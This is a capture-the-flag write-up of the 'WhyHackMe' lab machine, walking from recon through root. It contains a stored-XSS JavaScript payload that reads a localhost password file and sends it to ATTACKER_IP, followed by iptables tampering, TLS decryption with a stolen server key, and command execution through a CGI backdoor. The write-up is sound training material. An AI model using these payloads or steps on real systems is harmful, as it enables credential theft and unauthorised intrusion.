# WhyHackMe

**Difficulty:** Medium
## Reconnaissance

Running a standard nmap scan revealed three open ports:
```bash
nmap -sC -sV -oN nmap.txt MACHINE_IP -T4
```

**Results:**
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Welcome!!
```

The nmap scan immediately revealed something interesting - **anonymous FTP access** is enabled with a file called `update.txt` available.

Directory fuzzing with ffuf uncovered several endpoints:
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://MACHINE_IP/FUZZ -e .html,.php,.txt
```

Notable findings include `blog.php`, `login.php`, `register.php`, and a restricted `/dir` directory.

### FTP Enumeration

Connecting to the FTP server and retrieving the `update.txt` file revealed an interesting message:
```bash
ftp MACHINE_IP
# Username: anonymous
# Password: [blank]
get update.txt
```

**Content of update.txt:**
```
Hey I just removed the old user mike because that account was compromised and for any of you who wants the creds of new account visit 127.0.0.1/dir/pass.txt and don't worry this file is only accessible by localhost(127.0.0.1), so nobody else can view it except me or people with access to the common account. 
- admin
```

Perfect! We now know there's a password file at `127.0.0.1/dir/pass.txt` that's only accessible locally. Time to find a way to read it.

## Initial Access

### Finding the XSS Vector

After exploring the website, I discovered a blog functionality where users could post comments. The admin mentioned they regularly review comments - a classic setup for stored XSS attacks.

Initial testing showed that while comment content was sanitized, the **username field was vulnerable**. Registering with the username `<script>alert(1)</script>` successfully triggered JavaScript execution when posting a comment.

### Exploiting XSS for SSRF

Since we have XSS and the admin views our comments from localhost, we can leverage this to perform SSRF (Server-Side Request Forgery) and read the password file mentioned in `update.txt`.

I crafted the following payload as my username:
```javascript
<script>
fetch('http://127.0.0.1/dir/pass.txt')
  .then(r=>r.text())
  .then(d=>fetch('http://ATTACKER_IP:8000/?data='+btoa(d)))
</script>
```

This payload does the following:
1. Fetches the password file from localhost
2. Base64 encodes the content
3. Sends it to our listening web server

Starting a listener on our attack machine:
```bash
python3 -m http.server 8000
```

After posting the comment and waiting for the admin to view it, we received an incoming request:
```bash
MACHINE_IP - - [18/Dec/2025 20:36:02] "GET /?data=REDACTED HTTP/1.1" 200 -
```

Decoding the Base64 string revealed SSH credentials:
```bash
echo "REDACTED" | base64 -d
jack:REDACTED
```

### SSH Access

With valid credentials in hand, we can now SSH into the target:
```bash
ssh jack@MACHINE_IP
Password: REDACTED
```

Success! We're in as user `jack`. The first flag can be obtained:
```bash
cat /home/jack/user.txt
THM{REDACTED}
```

## Privilege Escalation

Time to enumerate the system. I ran some basic checks:
```bash
sudo -l
```

**Output:**
```
(ALL : ALL) /usr/sbin/iptables
```

User `jack` has sudo privileges for `/usr/sbin/iptables`. Before exploring this further, I noticed a file in `/opt`:
```bash
cat /opt/urgent.txt
```

**Content:**
```
Hey guys, after the hack some files have been placed in /usr/lib/cgi-bin/ and when I try to remove them, they wont, even though I am root. Please go through the pcap file in /opt and help me fix the server. And I temporarily blocked the attackers access to the backdoor by using iptables rules. The cleanup of the server is still incomplete I need to start by deleting these files first.
```

This message mentions a backdoor blocked by iptables and a PCAP file for analysis. Perfect lead!

### Analyzing iptables Rules

I examined the current iptables configuration:
```bash
sudo /usr/sbin/iptables -L -n -v --line-numbers
```

**Key finding:**
```
Chain INPUT (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         
 1531 91860 DROP       tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:41312
```

Port **41312** was being blocked! This is clearly the backdoor mentioned in the message. Let's unblock it:
```bash
sudo /usr/sbin/iptables -D INPUT 1
```

Now scanning the newly accessible port:
```bash
nmap -sV -p 41312 MACHINE_IP
```

**Result:**
```
PORT      STATE SERVICE VERSION
41312/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: www.example.com
```

An Apache web server running on HTTPS! Attempting to access it:
```bash
curl -k https://localhost:41312/cgi-bin/
```

**Response:**
```html
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
```

Access denied, but we know the backdoor exists somewhere in `/cgi-bin/`. Time to analyze the PCAP.

### PCAP Analysis

The traffic on port 41312 is encrypted with HTTPS, but the private key should be on the server:
```bash
find / -name "*.key" 2>/dev/null
/etc/apache2/certs/apache.key
```

I transferred both the PCAP and the SSL key to my attack machine for analysis:
```bash
scp jack@MACHINE_IP:/opt/capture.pcap .
scp jack@MACHINE_IP:/etc/apache2/certs/apache.key .
```

**Decrypting HTTPS traffic in Wireshark:**
Added the SSL private key to Wireshark's TLS settings for port 41312, then reloaded the capture and filtered for `http` requests to reveal the decrypted traffic.

Following the decrypted HTTP streams revealed the backdoor URL:
```
GET /cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id HTTP/1.1
```

The backdoor is a Python CGI script that accepts encrypted commands via the `key`, `iv`, and `cmd` parameters!

### Exploiting the Backdoor

**Testing the backdoor: **
```bash 
curl -k "https://localhost:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id" 
```
**Output:**
``` 
uid=33(www-data) gid=1003(h4ck3d) groups=1003(h4ck3d) 
```

```bash
curl -k "https://localhost:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=sudo%20cat%20/root/root.txt"
```

**Root flag obtained:**
```
{REDACTED}
```
